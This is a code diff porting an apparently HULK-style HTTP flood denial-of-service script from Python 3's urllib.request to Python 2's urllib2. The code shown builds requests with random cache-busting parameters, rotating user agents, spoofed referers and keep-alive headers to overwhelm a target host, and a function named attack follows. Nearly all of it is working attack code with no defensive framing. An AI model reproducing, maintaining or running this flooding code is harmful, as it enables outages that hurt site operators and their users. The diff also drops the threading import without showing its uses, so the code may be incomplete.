@@ -8,8 +8,7 @@ import signal
 import socket
 import getopt
 import random
-import urllib.request
-import threading
+import urllib2  # Use urllib2 for Python 2
 
 def usage():
     print('  #######################')
@@ -33,7 +32,7 @@ def useragent_list():
     headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
     headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
     headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-    return(headers_useragents)
+    return headers_useragents
 
 # generates a referer array
 def referer_list():
@@ -42,7 +41,7 @@ def referer_list():
     headers_referers.append('http://www.usatoday.com/search/results?q=')
     headers_referers.append('http://engadget.search.aol.com/search?q=')
     headers_referers.append('http://' + host + '/')
-    return(headers_referers)
+    return headers_referers
 
 def handler(signum, _):
     if signum == signal.SIGALRM:
@@ -56,10 +55,10 @@ def buildblock(size):
     for i in range(0, size):
         a = random.randint(65, 90)
         out_str += chr(a)
-    return(out_str)
+    return out_str
 
 def send_packet(host, param_joiner):
-    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
+    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
     request.add_header('User-Agent', random.choice(headers_useragents))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -68,10 +67,10 @@ def send_packet(host, param_joiner):
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host', host)
     try:
-        response = urllib.request.urlopen(request)
-    except urllib.error.HTTPError:
+        response = urllib2.urlopen(request)
+    except urllib2.HTTPError:
         pass
-    except urllib.error.URLError:
+    except urllib2.URLError:
         pass
 
 def attack(host, param_joiner):
